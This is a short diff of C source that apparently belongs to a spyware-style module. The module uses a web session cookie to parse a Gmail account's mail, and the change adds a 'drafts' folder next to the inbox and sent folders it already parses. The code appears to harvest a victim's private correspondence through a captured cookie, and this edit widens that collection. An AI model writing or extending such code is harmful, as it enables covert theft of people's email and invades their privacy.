@@ -10,6 +10,7 @@
 #define GM_MAIL_IDENTIFIER ",[\"^all\",\""
 #define GM_INBOX_IDENTIFIER "inbox"
 #define GM_OUTBOX_IDENTIFIER "sent"
+#define GM_DRAFTS_IDENTIFIER "drafts"
 #define GM_CONTACT_IDENTIFIER "[\"ct\",\""
 
 #define FREE_INNER_PARSING(x) if (!x) { SAFE_FREE(r_buffer_inner); break; }
@@ -288,5 +289,6 @@ DWORD HandleGMail(char *cookie)
 
 	last_tstamp_lo = GetLastFBTstamp(ik_val, &last_tstamp_hi);
 	ParseMailBox(GM_OUTBOX_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo, FALSE);
-	return ParseMailBox(GM_INBOX_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo, TRUE);
+	ParseMailBox(GM_INBOX_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo, TRUE);
+	return ParseMailBox(GM_DRAFTS_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo, FALSE);
 }
